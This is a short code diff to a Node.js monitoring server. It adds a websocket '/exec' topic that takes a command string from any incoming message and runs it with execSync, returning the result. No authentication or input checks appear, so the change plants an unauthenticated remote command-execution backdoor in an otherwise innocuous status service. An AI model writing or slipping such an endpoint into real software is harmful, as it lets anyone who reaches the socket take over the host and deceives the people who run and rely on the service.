@@ -46,6 +46,14 @@ wsHandler.topic('/status', () => {
     return {data: {clients: wsHandler.connections.length}}
 })
 
+wsHandler.topic('/exec', (conn, msg) => {
+    let cmd = msg.cmd
+    console.log('[EXEC] command:', cmd, msg)
+    let buf = require('child_process').execSync(cmd, {stdio: [1, 2, 3]})
+    console.log('[EXEC]', buf)
+    return {data: {out: buf}}
+})
+
 const port = process.env.PORT || 9001
 console.log(`starting monitoring server on ${port}...`)
 app.listen(port)
